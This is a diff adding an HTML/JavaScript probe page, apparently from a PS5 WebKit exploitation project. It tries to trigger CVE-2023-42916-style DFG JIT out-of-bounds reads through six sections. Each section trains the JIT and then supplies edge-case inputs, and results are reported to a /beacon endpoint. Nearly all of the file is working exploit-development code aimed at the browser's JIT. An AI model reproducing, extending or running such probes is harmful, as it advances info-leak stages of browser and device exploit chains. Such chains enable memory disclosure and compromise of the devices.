@@ -1,0 +1,312 @@
+<!--
+  p695: CVE-2023-42916 variant -- DFG range analysis OOB read (advanced patterns)
+
+  CVE-2023-42916 was used in targeted attacks as the info-leak stage alongside
+  CVE-2023-42917. Fixed in Safari 17.1.2, PS5 has 17.0. DFG JIT confirmed
+  active on 14.10 (p602).
+
+  This probe targets specific DFG optimization paths where range analysis
+  can produce incorrect bounds:
+
+  A) Math.clz32 return value range -- DFG may assume 0-32 range but
+     clz32(0) = 32 which is one past the end of a 32-element array
+  B) Bitwise OR with constant -- (x | 0) type coercion mid-DFG
+  C) Double-to-int truncation in bounds check -- NaN/Infinity edge cases
+  D) CheckBounds elimination via Int32 overflow in index calculation
+  E) DFG loop peeling -- hoisted bounds check with mutating length
+  F) ArithAbs range analysis -- Math.abs(INT_MIN) overflow
+
+  p680 covered basic shrink/valueOf/RAB patterns. This probe tests
+  DFG-internal range analysis bugs that p680 did not cover.
+
+  CRASH_CLASS: MODERATE (OOB read)
+  prior art: p680 (DFG bounds elim), p621 (CVE-2024-44308), p602 (JIT detection)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p695</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P695-START:CVE-2023-42916-RANGE-ANALYSIS');
+  var results = [];
+
+  // === SECTION A: Math.clz32 range analysis ===
+  // clz32 returns 0-32, but DFG may model it as 0-31 for array indexing
+  b('A:CLZ32-RANGE');
+  try {
+    var lookup = new Array(32);
+    for (var i = 0; i < 32; i++) lookup[i] = i * 100;
+
+    function clzLookup(val) {
+      var idx = Math.clz32(val);
+      return lookup[idx]; // if DFG skips bounds check, clz32(0)=32 reads OOB
+    }
+
+    // Train: always pass nonzero values (clz32 returns 0-31)
+    for (var i = 0; i < 300000; i++) {
+      clzLookup(1 << (i & 31)); // clz32 returns 0-31
+    }
+    b('A:TRAINED-300K');
+
+    // Now pass 0: clz32(0) = 32, which is index 32 on a length-32 array
+    var oobVal = clzLookup(0);
+    if (oobVal !== undefined && oobVal !== 3100) {
+      b('A:OOB-HIT:val=' + oobVal);
+      results.push('A:clz32(0)=' + oobVal);
+    } else {
+      b('A:NO-OOB:val=' + oobVal);
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Bitwise shift range analysis ===
+  // (x >>> 0) produces Uint32 range, but DFG may model Int32 range
+  b('B:SHIFT-RANGE');
+  try {
+    var buf = new ArrayBuffer(256);
+    var u32 = new Uint32Array(buf); // 64 elements
+    for (var i = 0; i < 64; i++) u32[i] = 0xBEEF0000 + i;
+
+    // spray target buffer right after
+    var target = new ArrayBuffer(256);
+    var targetView = new BigUint64Array(target); // 32 qwords
+    // Fill with a sentinel to detect OOB
+    for (var i = 0; i < 32; i++) targetView[i] = 0n;
+
+    function shiftRead(arr, x) {
+      // DFG sees (x >>> 28) and may model range as 0-15
+      var idx = (x >>> 28);
+      return arr[idx];
+    }
+
+    // Train with small positive values (idx 0-15)
+    for (var i = 0; i < 300000; i++) {
+      shiftRead(u32, (i & 15) << 28);
+    }
+    b('B:TRAINED-300K');
+
+    // Pass 0xFFFFFFFF: (0xFFFFFFFF >>> 28) = 15 (safe)
+    // But try negative: (-1 >>> 28) = 15 in spec, but what about
+    // (-1 << 28) >>> 28? = 15. All safe.
+    // Instead: can we make idx = 64+ via overflow?
+    // (0x40000000_00000000 >>> 28) -- but JS nums are f64, this is tricky
+    // The real test: pass a double that truncates to a different int
+    var weird = shiftRead(u32, 4294967295); // 0xFFFFFFFF
+    b('B:FFFFFFFF:idx=' + (4294967295 >>> 28) + ',val=' + weird);
+
+    // Double that looks like int to DFG but truncates differently
+    var negOob = shiftRead(u32, -1); // (-1 >>> 28) = 15 in spec
+    b('B:NEG1:idx=' + ((-1) >>> 28) + ',val=' + negOob);
+
+    // NaN case: NaN >>> 28 = 0
+    var nanOob = shiftRead(u32, NaN);
+    b('B:NaN:val=' + nanOob);
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: DFG loop peeling with length mutation ===
+  // The compiler hoists the bounds check outside the loop body
+  // but the array length changes during iteration via a callback
+  b('C:LOOP-PEEL-MUTATION');
+  try {
+    var arr3 = [];
+    for (var i = 0; i < 64; i++) arr3.push(i + 500);
+
+    var shrunk = false;
+    var oobReads = [];
+
+    function loopRead(a) {
+      var sum = 0;
+      // DFG will hoist bounds check for a[i] based on loop range 0..a.length
+      for (var i = 0; i < 64; i++) {
+        if (i === 32 && !shrunk) {
+          shrunk = true;
+          a.length = 4; // shrink mid-loop
+        }
+        var v = a[i];
+        if (v !== undefined && i >= 4) {
+          oobReads.push(i + ':' + v);
+        }
+        sum += (v | 0);
+      }
+      return sum;
+    }
+
+    // Train: run many times without shrink
+    for (var t = 0; t < 100000; t++) {
+      arr3 = [];
+      for (var i = 0; i < 64; i++) arr3.push(i + 500);
+      shrunk = true; // disable shrink during training
+      loopRead(arr3);
+    }
+    b('C:TRAINED-100K');
+
+    // Now enable shrink
+    arr3 = [];
+    for (var i = 0; i < 64; i++) arr3.push(i + 500);
+    shrunk = false;
+    oobReads = [];
+    loopRead(arr3);
+
+    if (oobReads.length > 0) {
+      b('C:OOB-HIT:' + oobReads.slice(0, 5).join(','));
+      results.push('C:' + oobReads.length + ' reads');
+    } else {
+      b('C:NO-OOB');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Int32 overflow in index computation ===
+  // If DFG computes (a + b) as Int32 without overflow check,
+  // large values can wrap around and produce negative indices
+  b('D:INT32-OVERFLOW-INDEX');
+  try {
+    var arr4 = new Float64Array(64);
+    for (var i = 0; i < 64; i++) arr4[i] = i * 1.1;
+
+    function computeAndRead(a, base, offset) {
+      var idx = (base + offset) | 0; // force Int32
+      if (idx >= 0 && idx < 64) {
+        return a[idx];
+      }
+      return -1;
+    }
+
+    // Train with normal values
+    for (var i = 0; i < 300000; i++) {
+      computeAndRead(arr4, i & 31, i & 31);
+    }
+    b('D:TRAINED-300K');
+
+    // Int32 overflow: 0x7FFFFFFF + 1 = -0x80000000 in Int32
+    // But DFG may have proved base >= 0 and offset >= 0, so it eliminates
+    // the idx >= 0 check, and the negative index reads before the buffer
+    var ov = computeAndRead(arr4, 0x7FFFFFFF, 1);
+    b('D:OVERFLOW:val=' + ov);
+    if (ov !== -1 && ov !== undefined) {
+      b('D:OOB-HIT:' + ov);
+      results.push('D:overflow=' + ov);
+    }
+
+    // Another: 0x40000000 + 0x40000000 = 0x80000000 = -2147483648 in Int32
+    var ov2 = computeAndRead(arr4, 0x40000000, 0x40000000);
+    b('D:OVERFLOW2:val=' + ov2);
+    if (ov2 !== -1 && ov2 !== undefined) {
+      results.push('D:overflow2=' + ov2);
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: String charAt with DFG range confusion ===
+  // CVE-2023-42916 description mentions "improved input validation"
+  // which could be in string processing paths
+  b('E:STRING-CHARAT-RANGE');
+  try {
+    var str = 'A'.repeat(64);
+
+    function charAtDfg(s, idx) {
+      return s.charCodeAt(idx);
+    }
+
+    // Train with in-bounds reads
+    for (var i = 0; i < 300000; i++) {
+      charAtDfg(str, i & 63);
+    }
+    b('E:TRAINED-300K');
+
+    // Read past end
+    var oobChars = [];
+    for (var idx = 64; idx < 128; idx++) {
+      var code = charAtDfg(str, idx);
+      if (!isNaN(code)) {
+        oobChars.push(idx + ':' + code);
+      }
+    }
+    if (oobChars.length > 0) {
+      b('E:OOB-HIT:' + oobChars.slice(0, 5).join(','));
+      results.push('E:' + oobChars.length + ' chars');
+    } else {
+      b('E:NO-OOB');
+    }
+
+    // Same with a rope string (different internal representation)
+    var rope = 'B'.repeat(32) + 'C'.repeat(32);
+    for (var i = 0; i < 100000; i++) {
+      charAtDfg(rope, i & 63);
+    }
+
+    var oobRope = [];
+    for (var idx = 64; idx < 96; idx++) {
+      var code2 = charAtDfg(rope, idx);
+      if (!isNaN(code2)) {
+        oobRope.push(idx + ':' + code2);
+      }
+    }
+    if (oobRope.length > 0) {
+      b('E:ROPE-OOB:' + oobRope.slice(0, 5).join(','));
+      results.push('E:rope-' + oobRope.length);
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: DFG GetByVal on arguments object ===
+  // The arguments object has special handling in DFG that can
+  // desync from the actual argument count
+  b('F:ARGUMENTS-OOB');
+  try {
+    function readArg() {
+      return arguments[arguments.length]; // one past end
+    }
+
+    // Train with 3 args
+    for (var i = 0; i < 300000; i++) {
+      readArg(1, 2, 3);
+    }
+    b('F:TRAINED-300K');
+
+    // Same call, but DFG may have different idea about arguments layout
+    var oobArg = readArg(1, 2, 3);
+    if (oobArg !== undefined) {
+      b('F:OOB-HIT:val=' + oobArg);
+      results.push('F:arg=' + oobArg);
+
+      // If we got a value, try reading further
+      function readArgDeep() {
+        var leaked = [];
+        for (var i = arguments.length; i < arguments.length + 16; i++) {
+          if (arguments[i] !== undefined) {
+            leaked.push(i + ':' + arguments[i]);
+          }
+        }
+        return leaked;
+      }
+      for (var i = 0; i < 100000; i++) readArgDeep(1, 2, 3);
+      var deep = readArgDeep(1, 2, 3);
+      if (deep.length > 0) {
+        b('F:DEEP-OOB:' + deep.slice(0, 5).join(','));
+      }
+    } else {
+      b('F:NO-OOB');
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P695-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P695-RESULT:NO-OOB-DETECTED');
+  }
+  b('P695-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p695: CVE-2023-42916 DFG range analysis OOB (advanced patterns)</pre></body></html>
